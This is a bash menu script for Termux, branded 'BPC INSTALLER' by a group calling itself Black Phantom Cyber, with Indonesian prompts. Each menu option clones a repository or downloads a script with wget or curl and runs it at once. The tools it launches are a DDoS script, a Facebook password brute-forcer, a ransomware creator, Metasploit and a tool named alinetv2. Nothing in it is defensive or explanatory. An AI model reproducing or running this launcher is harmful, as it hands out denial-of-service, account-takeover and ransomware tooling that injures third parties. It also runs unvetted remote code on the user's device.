clear
blue='\033[34;1m'
green='\033[32;1m'  
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'                                         yellow='\033[33;1m'
clear
toilet -f slant "BPC INSTALLER" -F gay
echo $red"==============="
echo $green"tool by mr.spoon"
echo $yellow"dan dr.crzy yang gans"
echo $cyan"thanks to:clzxclc"
echo $purple"black phantom cyber"
echo $red"==============="
echo $yellow"MENU"
echo $red"==============="
echo $green"[1].DDOS-BPC"
 
echo $red"==============="
echo $yellow"[2].install metasploit-framework"
echo $red"==============="
echo $green"[3].BRUTEFORCE-FB"
echo $red"==============="
echo $blue"[4].RANSHOMWARE"
echo $red"==============="
echo $purple"[5].install ALINET"
echo $red"==============="
echo $cyan
read -p "masukan nomornya tod===>" pil;

if  [ $pil = 1 ] || [ $pil = 1]
then
clear
git clone http://github.com/BLACK-PHANTOM-CYBER/DDOS-BPC
cd DDOS-BPC
python2 SPOONDDOS.py
fi

if  [ $pil = 2 ] || [ $pil = 2]
then
clear
pkg update
pkg install wget
wget https://5hady.github.io/metasploit.sh
ls
bash metasploit.sh
sleep 1
pkg install curl
curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
chmod +x metasploit.sh
./metasploit.sh
sleep 1
mv metasploit-framework $HOME
cd $HOME/metasploit-framework
./msfconsole
fi
if  [ $pil = 3 ] || [ $pil = 3]
then 
clear
pkg updatae
pkg install git
git clone https://github.com/BLACK-PHANTOM-CYBER/BRUTERFORCE-FOR-FB
cd BRUTERFORCE-FOR-FB
python2 Hekel.py
fi
if [ $pil = 4 ] || [ $pil = 4]
then
clear
apt update && apt upgrade
pkg install git
git clone https://github.com/AttackerCyber007/CreateRansomware
cd CreateRansomware
sh Ransomware.sh
fi
if [ $pil = 5 ] || [ $pil = 5]
then
clear
pkg update && apt upgrade
pkg install git
git clone https://github.com/BPCATTACKER/alinetv2
cd alinetv2
sh alinetv2.sh
fi
